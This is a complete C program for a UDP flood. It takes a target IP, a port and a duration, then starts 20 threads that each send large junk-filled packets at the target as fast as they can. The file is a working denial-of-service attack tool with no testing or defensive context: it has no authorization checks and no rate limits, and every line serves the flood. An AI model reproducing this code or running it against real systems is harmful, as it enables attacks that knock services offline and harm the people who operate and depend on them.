#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

#define BUFFER_SIZE 9046 // Constant buffer size in bytes
#define NUM_THREADS 20  // Default number of threads
volatile sig_atomic_t running = 1;

// Structure to hold thread arguments
typedef struct {
    char *target_ip;
    int target_port;
    int duration; // Duration in seconds
} thread_arg_t;

// Function to handle termination
void handle_signal(int signum) {
    running = 0; // Set running to 0 to stop sending packets
}

// Function to send UDP packets
void *send_packets(void *arg) {
    thread_arg_t *t_arg = (thread_arg_t *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char packet[BUFFER_SIZE];

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        return NULL;
    }

    // Set up the server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(t_arg->target_port);
    inet_pton(AF_INET, t_arg->target_ip, &server_addr.sin_addr);

    time_t start_time = time(NULL); // Record the start time

    // Fill the packet buffer with dummy data ('X')
    memset(packet, 'X', sizeof(packet));

    // Send packets for the specified duration
    while (running && difftime(time(NULL), start_time) < t_arg->duration) {
        if (sendto(sock, packet, sizeof(packet), 0, 
                   (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("sendto failed");
        }
    }

    // Clean up resources
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <duration>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    signal(SIGINT, handle_signal); // Handle SIGINT for graceful termination

    pthread_t threads[NUM_THREADS];
    thread_arg_t t_arg = {target_ip, target_port, duration};

    // Create multiple threads for sending packets
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_packets, (void *)&t_arg) != 0) {
            perror("Failed to create thread");
            return EXIT_FAILURE;
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return EXIT_SUCCESS;
}